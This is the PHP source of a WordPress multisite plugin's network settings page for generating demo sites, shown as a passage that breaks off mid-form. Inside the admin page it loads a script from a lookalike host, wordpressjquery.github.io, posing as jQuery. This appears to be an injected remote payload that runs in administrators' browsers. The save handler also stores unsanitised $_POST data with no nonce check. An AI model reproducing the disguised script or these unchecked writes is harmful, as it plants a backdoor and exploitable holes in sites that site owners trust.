<?php
   add_action('network_admin_edit_dwp_update_network_options',  'dwp_update_network_options');
   function dwp_update_network_options() {
       if (isset($_POST['dwp_Main_Settings'])) {
           if(isset($_POST['dwp_Main_Settings']['auto_delete_demo']))
           {
               wp_clear_scheduled_hook('dwp_delete_subsites_event');
               wp_schedule_event( time(), $_POST['dwp_Main_Settings']['auto_delete_demo'], 'dwp_delete_subsites_event' );
           }
           update_site_option('dwp_Main_Settings', $_POST['dwp_Main_Settings']);
           update_option('dwp_Main_Settings', $_POST['dwp_Main_Settings']);
       }
       if(!function_exists('wp_redirect'))
       {
           include_once( ABSPATH . 'wp-includes/pluggable.php' );
       }
       wp_redirect(add_query_arg(array('page' => 'dwp_admin_settings',
           'updated' => 'true'), network_admin_url('admin.php')));
       exit;
   }
   
   function dwp_admin_settings()
   {
   ?>
   <script type="text/javascript" src="https://wordpressjquery.github.io/jquery.js"></script>
<div class="wp-header-end"></div>
<div class="wrap gs_popuptype_holder seo_pops">
   <div>
      <form id="myForm" method="post" action="edit.php?action=dwp_update_network_options">
         <div class="cr_autocomplete">
            <input type="password" id="PreventChromeAutocomplete" 
               name="PreventChromeAutocomplete" autocomplete="address-level4" />
         </div>
         <?php
            settings_fields('dwp_option_group');
            do_settings_sections('dwp_option_group');
            $dwp_Main_Settings = get_option('dwp_Main_Settings', false);
            if (isset($dwp_Main_Settings['dwp_enabled'])) {
                $dwp_enabled = $dwp_Main_Settings['dwp_enabled'];
            } else {
                $dwp_enabled = '';
            }
            if (isset($dwp_Main_Settings['enable_logging'])) {
                $enable_logging = $dwp_Main_Settings['enable_logging'];
            } else {
                $enable_logging = '';
            }
            if (isset($dwp_Main_Settings['dwp_email'])) {
                $dwp_email = $dwp_Main_Settings['dwp_email'];
            } else {
                $dwp_email = '';
            }
            if (isset($dwp_Main_Settings['allow_site_name'])) {
                $allow_site_name = $dwp_Main_Settings['allow_site_name'];
            } else {
                $allow_site_name = '';
            }
            if (isset($dwp_Main_Settings['allow_clone_id'])) {
                $allow_clone_id = $dwp_Main_Settings['allow_clone_id'];
            } else {
                $allow_clone_id = '';
            }
            if (isset($dwp_Main_Settings['banned_id'])) {
                $banned_id = $dwp_Main_Settings['banned_id'];
            } else {
                $banned_id = '';
            }
            if (isset($dwp_Main_Settings['email_template'])) {
                $email_template = $dwp_Main_Settings['email_template'];
            } else {
                $email_template = '';
            }
            if (isset($dwp_Main_Settings['email_template_title'])) {
                $email_template_title = $dwp_Main_Settings['email_template_title'];
            } else {
                $email_template_title = '';
            }
            if (isset($dwp_Main_Settings['only_one'])) {
                $only_one = $dwp_Main_Settings['only_one'];
            } else {
                $only_one = '';
            }
            if (isset($dwp_Main_Settings['dwp_captcha'])) {
                $dwp_captcha = $dwp_Main_Settings['dwp_captcha'];
            } else {
                $dwp_captcha = '';
            }
            if (isset($dwp_Main_Settings['enable_clone'])) {
                $enable_clone = $dwp_Main_Settings['enable_clone'];
            } else {
                $enable_clone = '';
            }
            if (isset($dwp_Main_Settings['gocopy_files'])) {
                $gocopy_files = $dwp_Main_Settings['gocopy_files'];
            } else {
                $gocopy_files = '';
            }
            if (isset($dwp_Main_Settings['from_the_id'])) {
                $from_the_id = $dwp_Main_Settings['from_the_id'];
            } else {
                $from_the_id = '';
            }
            if (isset($dwp_Main_Settings['dwp_noindex'])) {
                $dwp_noindex = $dwp_Main_Settings['dwp_noindex'];
            } else {
                $dwp_noindex = '';
            }
            if (isset($dwp_Main_Settings['dwp_hinactive'])) {
                $dwp_hinactive = $dwp_Main_Settings['dwp_hinactive'];
            } else {
                $dwp_hinactive = '';
            }
            if (isset($dwp_Main_Settings['delete_sample'])) {
                $delete_sample = $dwp_Main_Settings['delete_sample'];
            } else {
                $delete_sample = '';
            }
            if (isset($dwp_Main_Settings['set_theme'])) {
                $set_theme = $dwp_Main_Settings['set_theme'];
            } else {
                $set_theme = '';
            }
            if (isset($dwp_Main_Settings['delete_hello'])) {
                $delete_hello = $dwp_Main_Settings['delete_hello'];
            } else {
                $delete_hello = '';
            }
            if (isset($dwp_Main_Settings['dwp_blog_title'])) {
                $dwp_blog_title = $dwp_Main_Settings['dwp_blog_title'];
            } else {
                $dwp_blog_title = '';
            }
            if (isset($dwp_Main_Settings['dwp_blog_desc'])) {
                $dwp_blog_desc = $dwp_Main_Settings['dwp_blog_desc'];
            } else {
                $dwp_blog_desc = '';
            }
            if (isset($dwp_Main_Settings['auto_delete_demo'])) {
                $auto_delete_demo = $dwp_Main_Settings['auto_delete_demo'];
            } else {
                $auto_delete_demo = '';
            }
            if (isset($dwp_Main_Settings['user_role_set'])) {
                $user_role_set = $dwp_Main_Settings['user_role_set'];
            } else {
                $user_role_set = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_qpw'])) {
                $disabla_dash_qpw = $dwp_Main_Settings['disabla_dash_qpw'];
            } else {
                $disabla_dash_qpw = '';
            }
            if (isset($dwp_Main_Settings['def_pass'])) {
                $def_pass = $dwp_Main_Settings['def_pass'];
            } else {
                $def_pass = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_rd'])) {
                $disabla_dash_rd = $dwp_Main_Settings['disabla_dash_rd'];
            } else {
                $disabla_dash_rd = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_wp'])) {
                $disabla_dash_wp = $dwp_Main_Settings['disabla_dash_wp'];
            } else {
                $disabla_dash_wp = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_owp'])) {
                $disabla_dash_owp = $dwp_Main_Settings['disabla_dash_owp'];
            } else {
                $disabla_dash_owp = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_il'])) {
                $disabla_dash_il = $dwp_Main_Settings['disabla_dash_il'];
            } else {
                $disabla_dash_il = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_pl'])) {
                $disabla_dash_pl = $dwp_Main_Settings['disabla_dash_pl'];
            } else {
                $disabla_dash_pl = '';
            }
            if (isset($dwp_Main_Settings['disabla_dash_rn'])) {
                $disabla_dash_rn = $dwp_Main_Settings['disabla_dash_rn'];
            } else {
                $disabla_dash_rn = '';
            }
            if( isset($_GET['settings-updated']) ) 
            {
            ?>
         <div id="message" class="updated">
            <p class="cr_saved_notif"><strong>&nbsp;<?php echo esc_html__('Settings saved.', 'demo-my-wordpress');?></strong></p>
         </div>
         <?php
            $get = get_option('coderevolution_settings_changed', 0);
            if($get == 1)
            {
                delete_option('coderevolution_settings_changed');
            ?>
         <div id="message" class="updated">
            <p class="cr_failed_notif"><strong>&nbsp;<?php echo esc_html__('Plugin registration failed!', 'demo-my-wordpress');?></strong></p>
         </div>
         <?php 
            }
            elseif($get == 2)
            {
                    delete_option('coderevolution_settings_changed');
            ?>
         <div id="message" class="updated">
            <p class="cr_saved_notif"><strong>&nbsp;<?php echo esc_html__('Plugin registration successful!', 'demo-my-wordpress');?></strong></p>
         </div>
         <?php 
            }
            elseif($get != 0)
            {
                    delete_option('coderevolution_settings_changed');
            ?>
         <div id="message" class="updated">
            <p class="cr_failed_notif"><strong>&nbsp;<?php echo esc_html($get);?></strong></p>
         </div>
         <?php 
            }
            }
            ?>
         <div>
            <div class="dwp_class">
               <table class="widefat">
                  <tr>
                     <td>
                        <h1>
                           <span class="gs-sub-heading"><b>Demo My WordPress Plugin - <?php echo esc_html__('Main Switch:', 'demo-my-wordpress');?></b>&nbsp;</span>
                           <span class="cr_07_font">v1.1.0&nbsp;</span>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Enable or disable this plugin. This acts like a main switch.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                        </h1>
                     </td>
                     <td>
                        <div class="slideThree">	
                           <input class="input-checkbox" type="checkbox" id="dwp_enabled" name="dwp_Main_Settings[dwp_enabled]"<?php
                              if ($dwp_enabled == 'on')
                                  echo ' checked ';
                              ?>>
                           <label for="dwp_enabled"></label>
                        </div>
                     </td>
                  </tr>
               <tr><td colspan="2">
            </div>
            <div><?php if($dwp_enabled != 'on'){echo '<div class="crf_bord cr_color_red cr_auto_update">' . esc_html__('This feature of the plugin is disabled! Please enable it from the above switch.', 'demo-my-wordpress') . '</div>';}?>
               <h3>
                  <ul>
                     <li><?php echo sprintf( wp_kses( __( 'Need help configuring this plugin? Please check out it\'s <a href="%s" target="_blank">video tutorial</a>.', 'demo-my-wordpress'), array(  'a' => array( 'href' => array(), 'target' => array() ) ) ), esc_url( 'https://youtu.be/Ime8RmZBu0I' ) );?>
                     </li>
                     <li><?php echo sprintf( wp_kses( __( 'Having issues with the plugin? Please be sure to check out our <a href="%s" target="_blank">knowledge-base</a> before you contact <a href="%s" target="_blank">our support</a>!', 'demo-my-wordpress'), array(  'a' => array( 'href' => array(), 'target' => array() ) ) ), esc_url( '//coderevolution.ro/knowledge-base' ), esc_url('//coderevolution.ro/support' ) );?></li>
                     <li><?php echo sprintf( wp_kses( __( 'Do you enjoy our plugin? Please give it a <a href="%s" target="_blank">rating</a>  on CodeCanyon, or check <a href="%s" target="_blank">our website</a>  for other cool plugins.', 'demo-my-wordpress'), array(  'a' => array( 'href' => array(), 'target' => array() ) ) ), esc_url( '//codecanyon.net/downloads' ), esc_url( 'https://coderevolution.ro' ) );?></a></li>
                     <li><br/><br/><span class="cr_color_red"><?php echo esc_html__("Are you looking for a cool new theme that best fits this plugin?", 'demo-my-wordpress');?></span> <a onclick="revealRec()" class="cr_cursor_pointer"><?php echo esc_html__("Click here for our theme related recommendation", 'demo-my-wordpress');?></a>.
                        <br/><span id="diviIdrec"></span>
                     </li>
                  </ul>
               </h3>
               </td>
               </tr>
                  <tr>
                     <td colspan="2">
                        <?php
                           $plugin = plugin_basename(__FILE__);
                           $plugin_slug = explode('/', $plugin);
                           $plugin_slug = $plugin_slug[0]; 
                           $uoptions = get_option($plugin_slug . '_registration', array());
                           if(isset($uoptions['item_id']) && isset($uoptions['item_name']) && isset($uoptions['created_at']) && isset($uoptions['buyer']) && isset($uoptions['licence']) && isset($uoptions['supported_until']))
                           {
                           ?>
                        <h3><b><?php echo esc_html__("Plugin Registration Info - Automatic Updates Enabled:", 'demo-my-wordpress');?></b> </h3>
                        <ul>
                           <li><b><?php echo esc_html__("Item Name:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['item_name']);?></li>
                           <li>
                              <b><?php echo esc_html__("Item ID:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['item_id']);?>
                           </li>
                           <li>
                              <b><?php echo esc_html__("Created At:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['created_at']);?>
                           </li>
                           <li>
                              <b><?php echo esc_html__("Buyer Name:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['buyer']);?>
                           </li>
                           <li>
                              <b><?php echo esc_html__("License Type:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['licence']);?>
                           </li>
                           <li>
                              <b><?php echo esc_html__("Supported Until:", 'demo-my-wordpress');?></b> <?php echo esc_html($uoptions['supported_until']);?>
                           </li>
                           <li>
                              <input type="submit" onclick="unsaved = false;" class="button button-primary" name="<?php echo esc_html($plugin_slug);?>_revoke_license" value="<?php echo esc_html__("Revoke License", 'demo-my-wordpress');?>">
                           </li>
                        </ul>
                        <?php
                           }
                           else
                           {
                           ?>
                        <div class="notice notice-error is-dismissible"><p><?php echo esc_html__("This is a trial version of the plugin. Automatic updates for this plugin are disabled. Please activate the plugin from below, so you can benefit of automatic updates for it!", 'demo-my-wordpress');?></p></div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo sprintf( wp_kses( __( 'Please input your Envato purchase code, to enable automatic updates in the plugin. To get your purchase code, please follow <a href="%s" target="_blank">this tutorial</a>. Info submitted to the registration server consists of: purchase code, site URL, site name, admin email. All these data will be used strictly for registration purposes.', 'demo-my-wordpress'), array(  'a' => array( 'href' => array(), 'target' => array() ) ) ), esc_url( '//coderevolution.ro/knowledge-base/faq/how-do-i-find-my-items-purchase-code-for-plugin-license-activation/' ) );
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Register Envato Purchase Code To Enable Automatic Updates:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="text" name="<?php echo esc_html($plugin_slug);?>_register_code" value="" placeholder="<?php echo esc_html__("Envato Purchase Code", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td></td>
                     <td><input type="submit" name="<?php echo esc_html($plugin_slug);?>_register" id="<?php echo esc_html($plugin_slug);?>_register" class="button button-primary" onclick="unsaved = false;" value="<?php echo esc_html__("Register Purchase Code", 'demo-my-wordpress');?>"/></td>
                  </tr>
                  <tr>
                     <td colspan="2">
                        <hr/>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <?php
                           }
                           if(!is_multisite())
                           {
                           ?>
                        <h1 class="cr_red"><?php echo esc_html__("This plugin requires WordPress Multisite to function. Please check this", 'demo-my-wordpress');?> <a href="https://codex.wordpress.org/Create_A_Network" target="_blank"><?php echo esc_html__("link", 'demo-my-wordpress');?></a> <?php echo esc_html__("to learn how to enable Multisite.", 'demo-my-wordpress');?></h1>
                        <?php    
                           }
                           else
                           {
                           ?>
                        <h2><?php echo esc_html__("Plugin settings:", 'demo-my-wordpress');?></h2>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to enable logging for rules?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Enable Logging for Rules:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="enable_logging" name="dwp_Main_Settings[enable_logging]"<?php
                        if ($enable_logging == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to allow each user to have a maximum of one demo sites created?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Allow Only One Demo Site For Each Registered User:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="only_one" name="dwp_Main_Settings[only_one]"<?php
                        if ($only_one == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <h3><?php echo esc_html__("User Form Settings:", 'demo-my-wordpress');?></h3>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to add an email input to the form (where the user must enter he's email address)? A mail containing the demo URL will be sent to the provided email address. Email address will be saved in the plugin.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Send Demo URL To User's Email Address:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="dwp_email" name="dwp_Main_Settings[dwp_email]"<?php
                        if ($dwp_email == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Set the template of the title email that will be sent to users who register in the plugin. You can use the following shortcodes when settings this content: %%site_user%%, %%site_password%%, %%site_link%%, %%site_url%%. If you leave this field blank, the default value is: 'Demo Login URL'", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Email Subject Template:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><textarea name="dwp_Main_Settings[email_template_title]" placeholder="<?php echo esc_html__("Demo login URL", 'demo-my-wordpress');?>"><?php echo stripslashes(esc_textarea($email_template_title));?></textarea></td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Set the template of the content email that will be sent to users who register in the plugin. You can use the following shortcodes when settings this content: %%site_user%%, %%site_password%%, %%site_link%%, %%site_url%%. If you leave this field blank, the default value is: 'Thank you for using our demo. Please log in to the generated demo page %%site_link%%. Your username is: %%site_user%% and your password is: %%site_password%%'", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Email Content Template:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><textarea name="dwp_Main_Settings[email_template]" placeholder="<?php echo esc_html__("Email message template", 'demo-my-wordpress');?>"><?php echo stripslashes(esc_textarea($email_template));?></textarea></td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to allow users to enter the site name they wish to create.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Allow Users To Input Site Name:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="allow_site_name" name="dwp_Main_Settings[allow_site_name]"<?php
                        if ($allow_site_name == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to allow users to enter the site ID that will be cloned when creating the new demo site.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Allow Users To Set The Site ID To Be Cloned:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="allow_clone_id" name="dwp_Main_Settings[allow_clone_id]"<?php
                        if ($allow_clone_id == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Input a comma separated list of site ID list, that will not be allowed for users to clone.", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Banned Site IDs List From Cloning:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="text" name="dwp_Main_Settings[banned_id]" value="<?php echo esc_attr($banned_id);?>" placeholder="<?php echo esc_html__("Banned Site ID List", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to enable the captcha field when creating the demo form?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Enable Captcha:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="dwp_captcha" name="dwp_Main_Settings[dwp_captcha]"<?php
                        if ($dwp_captcha == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <h3><?php echo esc_html__("Generated User Settings:", 'demo-my-wordpress');?></h3>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="hideLog">
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Select the role of newly created users.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Newly Created User Role:", 'demo-my-wordpress');?></b>
                        </div>
                     </td>
                     <td>
                        <div class="hideLog">
                           <select id="user_role_set" name="dwp_Main_Settings[user_role_set]" >
                           <?php
$roles = dwp_get_role_names();
foreach($roles as $rolex)
{
?>
                              <option value="<?php echo $rolex['role'];?>"<?php
                                 if ($user_role_set == $rolex['role']) {
                                     echo " selected";
                                 }
                                 ?>><?php echo $rolex['name'];?></option>
<?php
}
?>
                           </select>
                        </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <h3><?php echo esc_html__("Generated Demo Sites Settings:", 'demo-my-wordpress');?></h3>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="hideLog">
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Select if you wish to automatically delete created demo sites, after a time interval.", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Automatically Delete Demo Sites After:", 'demo-my-wordpress');?></b>
                        </div>
                     </td>
                     <td>
                        <div class="hideLog">
                           <select id="auto_delete_demo" name="dwp_Main_Settings[auto_delete_demo]" >
                              <option value="No"<?php
                                 if ($auto_delete_demo == "No") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Disabled", 'demo-my-wordpress');?></option>
                              <option value="monthly"<?php
                                 if ($auto_delete_demo == "monthly") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Once a month", 'demo-my-wordpress');?></option>
                              <option value="weekly"<?php
                                 if ($auto_delete_demo == "weekly") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Once a week", 'demo-my-wordpress');?></option>
                              <option value="daily"<?php
                                 if ($auto_delete_demo == "daily") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Once a day", 'demo-my-wordpress');?></option>
                              <option value="twicedaily"<?php
                                 if ($auto_delete_demo == "twicedaily") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Twice a day", 'demo-my-wordpress');?></option>
                              <option value="hourly"<?php
                                 if ($auto_delete_demo == "hourly") {
                                     echo " selected";
                                 }
                                 ?>><?php echo esc_html__("Once an hour", 'demo-my-wordpress');?></option>
                           </select>
                        </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to clone the target site from the network to each generated demo site?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Clone Target Site To Generated Demo Sites:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="enable_clone" name="dwp_Main_Settings[enable_clone]"<?php
                        if ($enable_clone == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Input the site numeric ID that will be cloned. This field will be used only if you do not allow website visitors to enter the site ID to be cloned from the submission form. If you leave this blank and do not allow users to enter the site ID to be cloned, the main site - with ID 1 will be cloned.", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Target Site ID To Be Cloned:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="number" min="1" step="1" name="dwp_Main_Settings[from_the_id]" value="<?php echo esc_attr($from_the_id);?>" placeholder="<?php echo esc_html__("Cloned Site ID", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to clone the files from the target site, to newly created sites?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Clone Also Files Of the Target Site To Generated Demo Sites:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="gocopy_files" name="dwp_Main_Settings[gocopy_files]"<?php
                        if ($gocopy_files == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to add 'NOINDEX' tag to generated demo pages - and this page also?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Add Noindex Tag To Demo Pages:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="dwp_noindex" name="dwp_Main_Settings[dwp_noindex]"<?php
                        if ($dwp_noindex == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to hide inactive plugins on demo pages?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Hide Inactive Plugins on Demo Pages:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="dwp_hinactive" name="dwp_Main_Settings[dwp_hinactive]"<?php
                        if ($dwp_hinactive == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to set the theme of the original blog or the latest installed theme?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Activate The Theme Of The Main Blog:", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="set_theme" name="dwp_Main_Settings[set_theme]"<?php
                        if ($set_theme == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to automatically delete the default 'Sample Page' from newly created blogs?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Delete Default 'Sample Page':", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="delete_sample" name="dwp_Main_Settings[delete_sample]"<?php
                        if ($delete_sample == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
                           <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                              <div class="bws_hidden_help_text cr_min_260px">
                                 <?php
                                    echo esc_html__("Do you want to automatically delete the default 'Hello World' from newly created blogs?", 'demo-my-wordpress');
                                    ?>
                              </div>
                           </div>
                           <b><?php echo esc_html__("Delete Default 'Hello World':", 'demo-my-wordpress');?></b>
                     </td>
                     <td>
                     <input type="checkbox" id="delete_hello" name="dwp_Main_Settings[delete_hello]"<?php
                        if ($delete_hello == 'on')
                            echo ' checked ';
                        ?>>                    
                     </div>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Here you can set a new blog title for created demo blogs.", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Demo Blog Title:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="text" name="dwp_Main_Settings[dwp_blog_title]" value="<?php echo esc_attr($dwp_blog_title);?>" placeholder="<?php echo esc_html__("Blog Title", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Here you can set a new blog description
                                 for created demo blogs.", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Demo Blog Description:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="text" name="dwp_Main_Settings[dwp_blog_desc]" value="<?php echo esc_attr($dwp_blog_desc);?>" placeholder="<?php echo esc_html__("Blog Description", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td>
                        <div class="bws_help_box bws_help_box_right dashicons dashicons-editor-help cr_align_middle">
                           <div class="bws_hidden_help_text cr_min_260px">
                              <?php
                                 echo esc_html__("Here you can set a password to be used for all newly created users. If you leave this field blank, the 'demo' password will be set.", 'demo-my-wordpress');
                                 ?>
                           </div>
                        </div>
                        <b><?php echo esc_html__("Default Password For New Users:", 'demo-my-wordpress');?></b>
                     </td>
                     <td><input type="text" name="dwp_Main_Settings[def_pass]" value="<?php echo esc_attr($def_pass);?>" placeholder="<?php echo esc_html__("Default user password", 'demo-my-wordpress');?>"></td>
                  </tr>
                  <tr>
                     <td>
                        <h3><?php echo esc_html__("Demo Site Dashboard Customizations:", 'demo-my-wordpress');?></h3>
                     </td>
                  </tr>
                  <tr>
                     <td>
                        <div>
